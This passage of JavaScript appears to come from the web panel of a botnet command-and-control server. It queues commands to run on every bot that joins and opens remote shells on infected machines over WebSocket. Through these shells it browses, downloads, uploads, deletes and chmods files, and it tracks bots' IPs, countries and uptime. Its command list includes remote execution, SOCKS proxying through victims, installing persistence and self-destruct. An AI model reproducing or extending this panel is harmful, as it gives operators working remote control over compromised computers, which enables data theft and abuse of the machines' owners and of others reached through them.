      var u = (document.getElementById('t-arg-sa-user') || {}).value || '';
      var p = (document.getElementById('t-arg-sa-pass') || {}).value || '';
      if (u && p) args = u + ' ' + p;
      break;
    case '!scan': args = (document.getElementById('t-arg-scan-addr') || {}).value || ''; break;
    default: break;
  }
  var cmd = typ;
  if (args.trim()) cmd += ' ' + args.trim();
  return cmd;
}

function loadTasks() {
  fetch('/api/tasks').then(function (r) { return r.json(); }).then(function (tasks) {
    renderTaskTable(tasks);
  }).catch(function () { });
}

function renderTaskTable(tasks) {
  var wrap = document.getElementById('task-table-wrap');
  if (!wrap) return;
  var active = tasks.filter(function (t) { return !t.expired; });
  var tabCount = document.getElementById('tab-tasks-count');
  if (tabCount) tabCount.textContent = active.length;
  var activeCount = document.getElementById('task-active-count');
  if (activeCount) activeCount.textContent = active.length;
  if (!tasks || !tasks.length) {
    wrap.innerHTML = '<div class="task-empty">No active tasks. Create one above.</div>';
    return;
  }
  var html = '';
  tasks.forEach(function (t) {
    var isExpired = t.expired;
    var dotClass = isExpired ? 'expired' : 'active';
    var badgeClass = t.runOnce ? 'once' : 'every';
    var badgeText = t.runOnce ? 'Run Once' : 'Every Join';
    var created = new Date(t.createdAt);
    var createdStr = ('0' + created.getHours()).slice(-2) + ':' + ('0' + created.getMinutes()).slice(-2);
    var expiresStr = 'never';
    if (t.expiresAt && !isExpired) {
      var exp = new Date(t.expiresAt);
      var remaining = Math.max(0, Math.floor((exp - Date.now()) / 1000));
      if (remaining > 3600) expiresStr = Math.floor(remaining / 3600) + 'h ' + Math.floor((remaining % 3600) / 60) + 'm';
      else if (remaining > 60) expiresStr = Math.floor(remaining / 60) + 'm ' + (remaining % 60) + 's';
      else expiresStr = remaining + 's';
    } else if (isExpired) {
      expiresStr = 'expired';
    }
    html += '<div class="task-card' + (isExpired ? ' expired' : '') + '">' +
      '<div class="task-status-dot ' + dotClass + '"></div>' +
      '<div class="task-cmd" title="' + escHtml(t.command) + '">' + escHtml(t.command) + '</div>' +
      '<div class="task-meta">' +
        '<span class="task-badge ' + badgeClass + '">' + badgeText + '</span>' +
        '<span class="task-meta-item"><span class="task-meta-label">created</span> ' + createdStr + '</span>' +
        '<span class="task-meta-item"><span class="task-meta-label">TTL</span> ' + expiresStr + '</span>' +
        '<span class="task-meta-item"><span class="task-meta-label">ran on</span> ' + t.executed + ' bots</span>' +
      '</div>' +
      '<button class="task-remove" onclick="deleteTask(\'' + escHtml(t.id) + '\')">Stop</button>' +
    '</div>';
  });
  wrap.innerHTML = html;
}

function addTask() {
  var command = buildTaskCommand();
  var typ = document.getElementById('task-type').value;
  if ((typ === '!shell' || typ === '!detach') && command === typ) { showToast('Please enter a command', false); return; }
  if (typ === '!socksauth') {
    var u = (document.getElementById('t-arg-sa-user') || {}).value || '';
    var p = (document.getElementById('t-arg-sa-pass') || {}).value || '';
    if (!u || !p) { showToast('Username and password required', false); return; }
  }
  var duration = parseInt((document.getElementById('task-duration') || {}).value) || 0;
  var runOnce = (document.getElementById('task-runonce') || {}).checked || false;
  fetch('/api/tasks', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ command: command, duration: duration, runOnce: runOnce })
  }).then(function (r) { return r.json(); }).then(function (d) {
    if (d.success) {
      showToast('Task created: ' + command, true);
      document.getElementById('task-duration').value = '0';
      document.getElementById('task-runonce').checked = false;
      updateTaskArgFields();
      loadTasks();
    } else {
      showToast(d.error || 'Failed to create task', false);
    }
  }).catch(function () { showToast('Request failed', false); });
}

function deleteTask(id) {
  if (!confirm('Remove this task?')) return;
  fetch('/api/tasks?id=' + encodeURIComponent(id), { method: 'DELETE' })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      showToast(d.success ? 'Task removed' : (d.error || 'Failed'), d.success !== false);
      loadTasks();
    }).catch(function () { showToast('Request failed', false); });
}

// ---------------------------------------------------------------------------
// Notification Drawer
// ---------------------------------------------------------------------------

var notifHistory = [], notifUnseen = 0;

function addNotification(time, msg) {
  notifHistory.push({ time: time, msg: msg });
  if (notifHistory.length > 50) notifHistory = notifHistory.slice(-50);
  notifUnseen++; updateNotifBadge(); renderNotifList();
  lsSet('notifs', notifHistory);
}

function updateNotifBadge() {
  var b = document.getElementById('notif-badge');
  if (notifUnseen > 0) { b.style.display = 'flex'; b.textContent = notifUnseen > 99 ? '99+' : notifUnseen; }
  else { b.style.display = 'none'; }
}

// ---------------------------------------------------------------------------
// Tab switching
// ---------------------------------------------------------------------------

function switchTab(btn) {
  document.querySelectorAll('.tab').forEach(function (t) { t.classList.remove('active'); });
  document.querySelectorAll('.tab-panel').forEach(function (p) { p.classList.remove('active'); });
  btn.classList.add('active');
  var panel = document.getElementById(btn.getAttribute('data-tab'));
  if (panel) panel.classList.add('active');
  lsSet('tab', btn.getAttribute('data-tab'));
}

function toggleNotifs() {
  var d = document.getElementById('notif-drawer');
  if (d.classList.contains('open')) { d.classList.remove('open'); }
  else { d.classList.add('open'); notifUnseen = 0; updateNotifBadge(); }
}

function renderNotifList() {
  var nl = document.getElementById('notif-list');
  if (!notifHistory.length) { nl.innerHTML = '<div class="notif-empty">No notifications yet</div>'; return; }
  nl.innerHTML = notifHistory.map(function (n) {
    return '<div class="notif-entry"><div class="notif-time">' + escHtml(n.time) + '</div><div class="notif-msg">' + escHtml(n.msg) + '</div></div>';
  }).reverse().join('');
}

// ---------------------------------------------------------------------------
// Shell Modal — Enhanced with file browser, breadcrumb, tab completion,
// bot info sidebar, multi-tab, copy output, net scan, socks button
// ---------------------------------------------------------------------------

var shellWS = null, shellHistory = [], shellHistIdx = -1, shellBotID = '', shellCwd = '~';
var shellSessions = {};
var shellBgSessions = {};  // {botID: WebSocket} — live WS kept after shell close
var shellTabs = []; // [{botID, ws, output, cmds, cwd}]
var activeShellTab = 0;
var pendingFileRefresh = false;
var shellCmdLog = [];          // [{ts, cmd}] — persistent history log
var _shellFontSize = parseInt(localStorage.getItem('vision_shell_font_size') || '13', 10);

// Tab completion definitions
var tcCommands = [
  { cmd: '!shell', desc: 'Execute shell command' },
  { cmd: '!detach', desc: 'Background exec (no output)' },
  { cmd: '!stream', desc: 'Streaming exec (real-time)' },
  { cmd: '!socks', desc: 'Start SOCKS proxy' },
  { cmd: '!stopsocks', desc: 'Stop SOCKS proxy' },
  { cmd: '!socksauth', desc: 'Set SOCKS credentials' },
  { cmd: '!info', desc: 'System information' },
  { cmd: '!persist', desc: 'Install persistence' },
  { cmd: '!kill', desc: 'Self-destruct' }
];
var tcIdx = -1, tcMatches = [];

function openShell(botID) {
  closeShell();
  shellTabs = [{ botID: botID }];
  activeShellTab = 0;
  activateShellTab(0);
}

function addShellTab(botID) {
  // Check if tab already exists
  for (var i = 0; i < shellTabs.length; i++) {
    if (shellTabs[i].botID === botID) { switchShellTab(i); return; }
  }
  shellTabs.push({ botID: botID });
  switchShellTab(shellTabs.length - 1);
}

// makeBgMessageHandler buffers output arriving while the shell modal is closed.
function makeBgMessageHandler(botID) {
  return function(e) {
    try {
      var d = JSON.parse(e.data);
      if (!shellSessions[botID]) {
        shellSessions[botID] = { output: '', cmds: [], cwd: '~', cmdLog: [], bgBuffer: '' };
      }
      var text = (d.type === 'stream_stdout' || d.type === 'stream_stderr' || d.type === 'output')
        ? (d.output || '') : '';
      if (text) {
        shellSessions[botID].bgBuffer = (shellSessions[botID].bgBuffer || '') + text;
      }
    } catch (ex) {}
  };
}

// updateBgIndicators adds/removes .shell-bg-active on bot rows with live bg sessions.
function updateBgIndicators() {
  document.querySelectorAll('#bot-tbody tr.bot-row').forEach(function(r) {
    var id = r.getAttribute('data-botid');
    if (shellBgSessions[id] && shellBgSessions[id].readyState === WebSocket.OPEN) {
      r.classList.add('shell-bg-active');
    } else {
      r.classList.remove('shell-bg-active');
      if (shellBgSessions[id]) delete shellBgSessions[id];
    }
  });
}

function activateShellTab(idx) {
  var tab = shellTabs[idx];
  if (!tab) return;
  shellBotID = tab.botID;
  activeShellTab = idx;

  var overlay = document.getElementById('shell-overlay');
  var output = document.getElementById('shell-output');
  var input = document.getElementById('shell-input');
  document.getElementById('shell-title').textContent = 'Shell: ' + tab.botID;

  // Bot info in header meta
  var b = window._bots && window._bots[tab.botID];
  var meta = document.getElementById('shell-meta');
  if (b) {
    var socksTag = b.socksActive
      ? '<span style="color:var(--green)">SOCKS: <b>ON</b></span>'
      : '<span style="color:var(--text-dim)">SOCKS: OFF</span>';
    meta.innerHTML = '<span><b>' + escHtml(b.ip) + '</b></span>' +
      '<span>Arch: <b>' + escHtml(b.arch) + '</b></span>' + socksTag;
  } else { meta.innerHTML = ''; }

  // Bot info sidebar
  renderInfoSidebar(b);

  // Restore session
  var saved = shellSessions[tab.botID];
  if (saved) {
    output.innerHTML = saved.output;
    shellHistory = saved.cmds.slice();
    shellCwd = saved.cwd || '~';
    shellCmdLog = (saved.cmdLog || []).slice();
    output.scrollTop = output.scrollHeight;
  } else {
    output.innerHTML = '';
    shellHistory = [];
    shellCwd = '~';
    shellCmdLog = [];
  }

  updateBreadcrumb();
  document.getElementById('shell-prompt').textContent = shellCwd + '$ ';
  shellHistIdx = shellHistory.length;
  renderShellTabs();
  overlay.classList.add('open');
  // Apply saved font size
  document.querySelectorAll('.shell-output').forEach(function (el) { el.style.fontSize = _shellFontSize + 'px'; });
  input.focus();

  // Connect WebSocket — reuse a live background session if one exists for this bot
  var _bgWS = shellBgSessions[tab.botID];
  var _reusingBg = _bgWS && _bgWS.readyState === WebSocket.OPEN;
  if (shellWS && shellWS !== _bgWS) { shellWS.close(); shellWS = null; }
  if (_reusingBg) {
    shellWS = _bgWS;
    delete shellBgSessions[tab.botID];
    updateBgIndicators();
  } else {
    var proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
    shellWS = new WebSocket(proto + '//' + location.host + '/ws/shell?botID=' + encodeURIComponent(tab.botID));
  }

  shellWS.onmessage = function (e) {
    try {
      var d = JSON.parse(e.data);
      // Streaming stdout/stderr frames (Tier 2)
      if (d.type === 'stream_stdout') { appendOutput(d.output || ''); return; }
      if (d.type === 'stream_stderr') { appendStderrOutput(d.output || ''); return; }
      if (d.type === 'stream_start') { appendOutput('[streaming...]\n'); return; }
      // File download frame (Tier 3)
      if (d.type === 'file' && d.name && d.data) { shellTriggerDownload(d.name, d.data); return; }
      if (d.output) {
        // Check for combined cd+ls output (---LS--- marker from server-side cd handler)
        var lsMarker = d.output.indexOf('---LS---');
        if (lsMarker !== -1) {
          var beforeLs = d.output.substring(0, lsMarker);
          var lsOutput = d.output.substring(lsMarker + 9);
          appendOutput(beforeLs);
          var pwdLine = beforeLs.trim();
          if (pwdLine.match(/^\/[^\n]*$/) && !pwdLine.match(/\s/)) {
            shellCwd = pwdLine;
            document.getElementById('shell-prompt').textContent = shellCwd + '$ ';
            updateBreadcrumb();
          }
          parseFileList(lsOutput);
        } else {
          appendOutput(d.output);
          var trimmed = d.output.trim();
          if (pendingFileRefresh && (trimmed.match(/^total\s/m) || trimmed.match(/^[drwxlsStT\-]{10}\s/m))) {
            pendingFileRefresh = false;
            parseFileList(d.output);
          }
          if (trimmed.match(/^\/[^\n]*$/) && !trimmed.match(/\s/)) {
            shellCwd = trimmed;
            document.getElementById('shell-prompt').textContent = shellCwd + '$ ';
            updateBreadcrumb();
          }
        }
      }
    } catch (ex) { }
  };

  function shellTriggerDownload(name, b64data) {
    try {
      var bytes = atob(b64data);
      var arr = new Uint8Array(bytes.length);
      for (var i = 0; i < bytes.length; i++) arr[i] = bytes.charCodeAt(i);
      var blob = new Blob([arr], { type: 'application/octet-stream' });
      var url = URL.createObjectURL(blob);
      var a = document.createElement('a');
      a.href = url; a.download = name; a.click();
      URL.revokeObjectURL(url);
      showToast('Downloaded: ' + name, true);
    } catch (ex) { showToast('Download failed: ' + ex.message, false); }
  }
  shellWS.onclose = function () { appendOutput('\n[Connection closed]\n'); };

  if (_reusingBg) {
    // Flush any output buffered while the shell was in the background
    var _bgBuf = saved && saved.bgBuffer;
    if (_bgBuf) { saved.bgBuffer = ''; appendOutput(_bgBuf); }
    setTimeout(function () { refreshFiles(); }, 100);
  } else {
    shellWS.onopen = function () {
      if (!saved) {
        // New session — navigate to / so file tree shows full filesystem root
        shellWS.send(JSON.stringify({ command: 'cd /' }));
      } else {
        // Restored session — repopulate file browser for the saved cwd
        setTimeout(function () { refreshFiles(); }, 100);
      }
    };
  }
}

function switchShellTab(idx) {
  if (idx === activeShellTab && shellTabs.length > 0) return;
  // Save current state
  if (shellBotID) {
    shellSessions[shellBotID] = {
      output: document.getElementById('shell-output').innerHTML,
      cmds: shellHistory.slice(), cwd: shellCwd, cmdLog: shellCmdLog.slice()
    };
  }
  activateShellTab(idx);
}

function closeShellTab(idx) {
  if (shellTabs.length <= 1) { closeShell(); return; }
  var tab = shellTabs[idx];
  if (tab.botID === shellBotID && shellWS) {
    if (shellWS.readyState === WebSocket.OPEN) {
      var _bgBot = tab.botID;
      shellBgSessions[_bgBot] = shellWS;
      shellWS.onmessage = makeBgMessageHandler(_bgBot);
      shellWS.onclose = function () { delete shellBgSessions[_bgBot]; updateBgIndicators(); };
    } else {
      shellWS.close();
    }
    shellWS = null;
  }
  shellTabs.splice(idx, 1);
  if (activeShellTab >= shellTabs.length) activeShellTab = shellTabs.length - 1;
  activateShellTab(activeShellTab);
  updateBgIndicators();
}

function renderShellTabs() {
  var wrap = document.getElementById('shell-tabs');
  if (shellTabs.length <= 1) { wrap.innerHTML = ''; return; }
  wrap.innerHTML = shellTabs.map(function (t, i) {
    var cls = i === activeShellTab ? 'shell-tab active' : 'shell-tab';
    var id = t.botID.length > 10 ? t.botID.substring(0, 10) + '..' : t.botID;
    return '<span class="' + cls + '" onclick="switchShellTab(' + i + ')">' + escHtml(id) +
      '<span class="shell-tab-close" onclick="event.stopPropagation();closeShellTab(' + i + ')">&times;</span></span>';
  }).join('');
}

function closeShell() {
  if (shellBotID) {
    shellSessions[shellBotID] = {
      output: document.getElementById('shell-output').innerHTML,
      cmds: shellHistory.slice(), cwd: shellCwd, cmdLog: shellCmdLog.slice(), bgBuffer: ''
    };
  }
  document.getElementById('shell-overlay').classList.remove('open');
  if (shellWS) {
    if (shellBotID && shellWS.readyState === WebSocket.OPEN) {
      // Park the connection in the background rather than closing it
      var _bgBot = shellBotID;
      shellBgSessions[_bgBot] = shellWS;
      shellWS.onmessage = makeBgMessageHandler(_bgBot);
      shellWS.onclose = function () {
        delete shellBgSessions[_bgBot];
        updateBgIndicators();
      };
    } else {
      shellWS.close();
    }
    shellWS = null;
  }
  shellTabs = [];
  document.getElementById('tab-complete').style.display = 'none';
  updateBgIndicators();
}

function parseAnsi(text) {
  var frag = document.createDocumentFragment();
  var state = { bold: false, italic: false, underline: false, fg: null, bg: null };
  var re = /\x1b\[([0-9;]*)([A-Za-z])/g;
  var lastIndex = 0, match;
  function flush(str) {
    if (!str) return;
    var span = document.createElement('span');
    span.textContent = str;
    var cls = [];
    if (state.bold) cls.push('ansi-bold');
    if (state.italic) cls.push('ansi-italic');
    if (state.underline) cls.push('ansi-underline');
    if (state.fg !== null) cls.push('ansi-fg-' + state.fg);
    if (state.bg !== null) cls.push('ansi-bg-' + state.bg);
    if (cls.length) span.className = cls.join(' ');
    frag.appendChild(span);
  }
  while ((match = re.exec(text)) !== null) {
    flush(text.substring(lastIndex, match.index));
    lastIndex = re.lastIndex;
    if (match[2] !== 'm') continue;
    var codes = match[1] ? match[1].split(';').map(Number) : [0];
    for (var i = 0; i < codes.length; i++) {
      var c = codes[i];
      if (c === 0) { state = { bold: false, italic: false, underline: false, fg: null, bg: null }; }
      else if (c === 1) state.bold = true;
      else if (c === 3) state.italic = true;
      else if (c === 4) state.underline = true;
      else if (c >= 30 && c <= 37) state.fg = c - 30;
      else if (c >= 40 && c <= 47) state.bg = c - 40;
      else if (c >= 90 && c <= 97) state.fg = (c - 90) + 8;
      else if (c >= 100 && c <= 107) state.bg = (c - 100) + 8;
      else if (c === 39) state.fg = null;
      else if (c === 49) state.bg = null;
      else if (c === 22) state.bold = false;
      else if (c === 23) state.italic = false;
      else if (c === 24) state.underline = false;
    }
  }
  flush(text.substring(lastIndex));
  return frag;
}

function parseClickableOutput(text) {
  var frag = document.createDocumentFragment();
  // Skip heavy parsing on long lines (guards against base64/binary output)
  if (text.length > 200) { frag.appendChild(document.createTextNode(text)); return frag; }
  var re = /(\b(?:\d{1,3}\.){3}\d{1,3}\b)|(\/[a-zA-Z0-9._\-][a-zA-Z0-9._\-\/]*)/g;
  var last = 0, m;
  while ((m = re.exec(text)) !== null) {
    if (m.index > last) frag.appendChild(document.createTextNode(text.slice(last, m.index)));
    var val = m[0], span = document.createElement('span');
    span.textContent = val;
    if (m[1]) {
      span.className = 'out-ip'; span.title = 'Copy IP';
      span.onclick = (function (v) { return function () { try { navigator.clipboard.writeText(v); } catch (e) { } showToast('Copied: ' + v, true); }; })(val);
    } else {
      span.className = 'out-path'; span.title = 'Navigate to path';
      span.onclick = (function (v) { return function () { shellCd(v); }; })(val);
    }
    frag.appendChild(span);
    last = m.index + val.length;
  }
  if (last < text.length) frag.appendChild(document.createTextNode(text.slice(last)));
  return frag;
}

function appendOutput(text) {
  var el = document.getElementById('shell-output');
  var nearBottom = (el.scrollHeight - el.scrollTop - el.clientHeight) < 60;
  if (text.indexOf('\x1b[') !== -1) {
    el.appendChild(parseAnsi(text));
  } else {
    el.appendChild(parseClickableOutput(text));
  }
  if (nearBottom) el.scrollTop = el.scrollHeight;
}

function appendStderrOutput(text) {
  var el = document.getElementById('shell-output');
  var nearBottom = (el.scrollHeight - el.scrollTop - el.clientHeight) < 60;
  var span = document.createElement('span');
  span.style.color = 'var(--red, #f44)';
  span.textContent = text;
  el.appendChild(span);
  if (nearBottom) el.scrollTop = el.scrollHeight;
}

// ---------------------------------------------------------------------------
// Breadcrumb navigation
// ---------------------------------------------------------------------------

function updateBreadcrumb() {
  var bc = document.getElementById('shell-breadcrumb');
  if (!shellCwd || shellCwd === '~') {
    bc.innerHTML = '<span class="bc-seg bc-current">~</span>';
    return;
  }
  var parts = shellCwd.split('/').filter(function (p) { return p !== ''; });
  var html = '<span class="bc-seg" onclick="shellCd(\'/\')">/</span>';
  for (var i = 0; i < parts.length; i++) {
    html += '<span class="bc-sep">/</span>';
    var path = '/' + parts.slice(0, i + 1).join('/');
    if (i === parts.length - 1) {
      html += '<span class="bc-seg bc-current">' + escHtml(parts[i]) + '</span>';
    } else {
      html += '<span class="bc-seg" onclick="shellCd(\'' + path.replace(/'/g, "\\'") + '\')">' + escHtml(parts[i]) + '</span>';
    }
  }
  bc.innerHTML = html;
}

function shellCd(path) {
  if (!shellWS || shellWS.readyState !== 1) return;
  var cmd = 'cd ' + path;
  var p = document.getElementById('shell-prompt').textContent;
  appendOutput(p + ' ' + cmd + '\n');
  shellWS.send(JSON.stringify({ command: cmd }));
  shellHistory.push(cmd);
  shellHistIdx = shellHistory.length;
  // Server-side cd handler chains pwd + ls -laF automatically via ---LS--- marker
}

// ---------------------------------------------------------------------------
// File browser
// ---------------------------------------------------------------------------

function refreshFiles() {
  if (!shellWS || shellWS.readyState !== 1) return;
  pendingFileRefresh = true;
  shellWS.send(JSON.stringify({ command: 'ls -laF' }));
}

function parseFileList(output) {
  var wrap = document.getElementById('file-list');
  var lines = output.trim().split('\n');
  var entries = [];

  lines.forEach(function (line) {
    line = line.trim();
    if (!line || line.match(/^total\s/)) return;
    // Parse ls -la output: perms links owner group size month day time name
    var m = line.match(/^([drwxlsStT\-]{10})\s+\S+\s+\S+\s+\S+\s+\S+\s+\S+\s+\S+\s+\S+\s+(.+)$/);
    if (!m) return;
    var perms = m[1], name = m[2];
    var isDir = perms[0] === 'd';
    var isLink = perms[0] === 'l';
    var isExec = !isDir && !isLink && (perms[3] === 'x' || perms[6] === 'x' || perms[9] === 'x');
    // Clean name (remove trailing / or @ or * from ls -F)
    var displayName = name.replace(/[@*\/]$/, '');
    if (name.endsWith('/')) isDir = true;
    if (displayName === '.' || displayName === '..') return;
    // Handle symlinks: name -> target
    if (isLink && displayName.indexOf(' -> ') !== -1) {
      displayName = displayName.split(' -> ')[0];
    }
    entries.push({ name: displayName, isDir: isDir, isLink: isLink, isExec: isExec });
  });

  // Sort: dirs first, then files
  entries.sort(function (a, b) {
    if (a.isDir && !b.isDir) return -1;
    if (!a.isDir && b.isDir) return 1;
    return a.name.localeCompare(b.name);
  });

  if (!entries.length) {
    wrap.innerHTML = '<div class="file-empty">Empty directory</div>';
    return;
  }

  // Add parent dir entry
  var html = '<div class="file-entry fe-dir" onclick="shellCd(\'..\')"><span class="file-icon">..</span><span>../</span></div>';
  entries.forEach(function (e) {
    var cls = 'file-entry';
    var icon = '&#128196;'; // file icon
    var click = '';
    if (e.isDir) {
      cls += ' fe-dir'; icon = '&#128193;';
      click = 'onclick="shellCd(\'' + e.name.replace(/'/g, "\\'") + '\')"';
    } else if (e.isLink) {
      cls += ' fe-link'; icon = '&#128279;';
      click = 'onclick="shellSendCmd(\'cat ' + e.name.replace(/'/g, "\\'") + '\')"';
    } else if (e.isExec) {
      cls += ' fe-exec'; icon = '&#9881;';
      click = 'onclick="shellSendCmd(\'file ' + e.name.replace(/'/g, "\\'") + '\')"';
    } else {
      click = 'onclick="shellSendCmd(\'cat ' + e.name.replace(/'/g, "\\'") + '\')"';
    }
    var ctx = 'oncontextmenu="event.preventDefault();showFileCtx(event,\'' + e.name.replace(/\\/g, '\\\\').replace(/'/g, "\\'") + '\',' + (e.isDir ? 'true' : 'false') + ')"';
    html += '<div class="' + cls + '" ' + click + ' ' + ctx + '><span class="file-icon">' + icon + '</span><span>' + escHtml(e.name) + (e.isDir ? '/' : '') + '</span></div>';
  });
  wrap.innerHTML = html;
}

// ---------------------------------------------------------------------------
// File context menu
// ---------------------------------------------------------------------------

var _ctxEntry = null;

function showFileCtx(e, name, isDir) {
  _ctxEntry = { name: name, isDir: isDir, cwd: shellCwd };
  var m = document.getElementById('file-ctx-menu');
  document.getElementById('ctx-cd-item').style.display = isDir ? '' : 'none';
  document.getElementById('ctx-cat-item').style.display = !isDir ? '' : 'none';
  document.getElementById('ctx-chmod-item').style.display = !isDir ? '' : 'none';
  var x = e.clientX, y = e.clientY;
  if (x + 170 > window.innerWidth) x = window.innerWidth - 175;
  if (y + 220 > window.innerHeight) y = window.innerHeight - 225;
  m.style.left = x + 'px'; m.style.top = y + 'px'; m.style.display = 'block';
  e.stopPropagation();
}

function hideFileCtx() {
  var m = document.getElementById('file-ctx-menu');
  if (m) m.style.display = 'none';
}

document.addEventListener('click', hideFileCtx);
document.addEventListener('keydown', function (e) { if (e.key === 'Escape') hideFileCtx(); });

function _ctxPath() {
  if (!_ctxEntry) return '';
  var base = _ctxEntry.cwd === '~' ? '' : _ctxEntry.cwd;
  return (base ? base + '/' : '') + _ctxEntry.name;
}

function ctxCopyPath() {
  var p = _ctxPath();
  try { navigator.clipboard.writeText(p); } catch (e) { }
  showToast('Copied: ' + p, true); hideFileCtx();
}

function ctxCd() { shellCd(_ctxEntry.name); hideFileCtx(); }

function ctxCat() { shellSendCmd('cat ' + _shellQuoteJs(_ctxEntry.name)); hideFileCtx(); }

function ctxChmod() {
  var m = prompt('chmod mode (octal):', '755');
  hideFileCtx();
  if (!m) return;
  if (!shellWS || shellWS.readyState !== 1) { showToast('Not connected', false); return; }
  shellWS.send(JSON.stringify({ command: '!chmod ' + m + ' ' + _ctxPath() }));
  setTimeout(refreshFiles, 600);
}

function ctxDelete() {
  if (!confirm('Delete ' + _ctxEntry.name + '?')) { hideFileCtx(); return; }
  if (!shellWS || shellWS.readyState !== 1) { hideFileCtx(); showToast('Not connected', false); return; }
  if (_ctxEntry.isDir) {
    shellSendCmd('rm -rf ' + _shellQuoteJs(_ctxEntry.name));
  } else {
    shellWS.send(JSON.stringify({ command: '!rm ' + _ctxPath() }));
  }
  hideFileCtx(); setTimeout(refreshFiles, 800);
}

function ctxRename() {
  var n = prompt('Rename to:', _ctxEntry.name);
  hideFileCtx();
  if (!n || n === _ctxEntry.name) return;
  if (!shellWS || shellWS.readyState !== 1) { showToast('Not connected', false); return; }
  var dst = (_ctxEntry.cwd && _ctxEntry.cwd !== '~') ? _ctxEntry.cwd + '/' + n : n;
  shellWS.send(JSON.stringify({ command: '!mv ' + _ctxPath() + ' ' + dst }));
  setTimeout(refreshFiles, 600);
}

function ctxDownload() {
  hideFileCtx();
  if (_ctxEntry.isDir) { showToast('Cannot download a directory', false); return; }
  shellDownloadFile(_ctxEntry.name);
}

function _shellQuoteJs(s) { return "'" + s.replace(/'/g, "'\\''") + "'"; }

function shellSendCmd(cmd) {
  if (!shellWS || shellWS.readyState !== 1) return;
  var p = document.getElementById('shell-prompt').textContent;
  appendOutput(p + ' ' + cmd + '\n');
  shellWS.send(JSON.stringify({ command: cmd }));
  shellHistory.push(cmd);
  shellCmdLog.push({ ts: Date.now(), cmd: cmd });
  shellHistIdx = shellHistory.length;
}

// Sends a !download command; the CNC relays the file back as a {type:"file"} WS frame.
function shellDownloadFile(name) {
  if (!shellWS || shellWS.readyState !== 1) { showToast('Not connected', false); return; }
  var path = (_ctxEntry && _ctxEntry.cwd && _ctxEntry.cwd !== '~') ? _ctxEntry.cwd + '/' + name : name;
  shellSendCmd('!download ' + path);
}

// Triggers the hidden file input to pick a file for upload.
function shellUploadFile() {
  if (!shellWS || shellWS.readyState !== 1) { showToast('Not connected', false); return; }
  document.getElementById('shell-upload-input').value = '';
  document.getElementById('shell-upload-input').click();
}

// Called by the file input's onchange — reads the file as base64 and sends to bot.
function shellHandleUpload(input) {
  var file = input.files && input.files[0];
  if (!file || !shellWS || shellWS.readyState !== 1) return;
  if (file.size > 10 * 1024 * 1024) { showToast('File too large (>10MB)', false); return; }
  var destDir = shellCwd && shellCwd !== '~' ? shellCwd : '/tmp';
  var destPath = destDir + '/' + file.name;
  var reader = new FileReader();
  reader.onload = function(e) {
    var b64 = e.target.result.split(',')[1];
    appendOutput('[upload] sending ' + file.name + ' (' + file.size + ' bytes)...\n');
    shellWS.send(JSON.stringify({ type: 'upload', fileName: destPath, data: b64 }));
  };
  reader.readAsDataURL(file);
}

// ---------------------------------------------------------------------------
// Bot info sidebar
// ---------------------------------------------------------------------------

function renderInfoSidebar(b) {
  var body = document.getElementById('info-sidebar-body');
  if (!b) { body.innerHTML = '<div class="file-empty">No bot info</div>'; return; }
  body.innerHTML =
    '<div class="isb-row"><span class="isb-label">Bot ID</span><span class="isb-val" style="color:var(--blue)">' + escHtml(b.botID) + '</span></div>' +
    '<div class="isb-row"><span class="isb-label">IP Address</span><span class="isb-val">' + escHtml(b.ip) + '</span></div>' +
    '<div class="isb-row"><span class="isb-label">Country</span><span class="isb-val" style="color:var(--cyan)">' + escHtml(b.country) + '</span></div>' +
    '<div class="isb-row"><span class="isb-label">Architecture</span><span class="isb-val">' + escHtml(b.arch) + '</span></div>' +
    '<div class="isb-divider"></div>' +
    '<div class="isb-row"><span class="isb-label">RAM</span><span class="isb-val">' + formatRAM(b.ram) + '</span></div>' +
    '<div class="isb-row"><span class="isb-label">CPU Cores</span><span class="isb-val">' + b.cpuCores + '</span></div>' +
    '<div class="isb-row"><span class="isb-label">Process</span><span class="isb-val">' + escHtml(b.processName) + '</span></div>' +
    '<div class="isb-divider"></div>' +
    '<div class="isb-row"><span class="isb-label">Uptime</span><span class="isb-val">' + escHtml(b.uptime) + '</span></div>' +
    '<div class="isb-row"><span class="isb-label">Last Ping</span><span class="isb-val">' + ago(b.lastPing) + '</span></div>' +
    '<div class="isb-divider"></div>' +
    '<div class="isb-row"><span class="isb-label">SOCKS</span><span class="isb-val" style="color:' + (b.socksActive ? 'var(--green)' : 'var(--text-dim)') + '">' + (b.socksActive ? 'ON' : 'OFF') + '</span></div>' +
    (b.socksActive && b.socksRelay ? '<div class="isb-row"><span class="isb-label">Relay</span><span class="isb-val" style="color:var(--accent)">' + escHtml(b.socksRelay) + '</span></div>' : '');
}

// ---------------------------------------------------------------------------
// Tab completion
// ---------------------------------------------------------------------------

function showTabComplete(input) {
  var val = input.value;
  if (!val.startsWith('!')) { hideTabComplete(); return; }
  tcMatches = tcCommands.filter(function (c) { return c.cmd.indexOf(val) === 0; });
  if (!tcMatches.length) { hideTabComplete(); return; }
  tcIdx = 0;
  var wrap = document.getElementById('tab-complete');
  wrap.innerHTML = tcMatches.map(function (c, i) {
    return '<div class="tc-item' + (i === 0 ? ' tc-active' : '') + '" data-idx="' + i + '" onclick="selectTabComplete(' + i + ')">' +
      '<span class="tc-cmd">' + escHtml(c.cmd) + '</span><span class="tc-desc">' + escHtml(c.desc) + '</span></div>';
  }).join('');
  wrap.style.display = 'block';
}

function hideTabComplete() {
  document.getElementById('tab-complete').style.display = 'none';
  tcIdx = -1; tcMatches = [];
}

function selectTabComplete(idx) {
  if (idx >= 0 && idx < tcMatches.length) {
    var input = document.getElementById('shell-input');
    input.value = tcMatches[idx].cmd + ' ';
    input.focus();
  }
  hideTabComplete();
}

function navigateTabComplete(dir) {
  if (!tcMatches.length) return;
  tcIdx = (tcIdx + dir + tcMatches.length) % tcMatches.length;
  var items = document.querySelectorAll('#tab-complete .tc-item');
  items.forEach(function (it, i) {
    it.classList.toggle('tc-active', i === tcIdx);
  });
}

// ---------------------------------------------------------------------------
// Shell action buttons
// ---------------------------------------------------------------------------

function copyShellOutput() {
  var text = document.getElementById('shell-output').textContent;
  if (!text) { showToast('Nothing to copy', false); return; }
  navigator.clipboard.writeText(text).then(function () { showToast('Output copied to clipboard', true); })
    .catch(function () { showToast('Copy failed', false); });
}

function saveShellHistory() {
  var content = document.getElementById('shell-output').textContent;
  if (!content) { showToast('Nothing to save', false); return; }
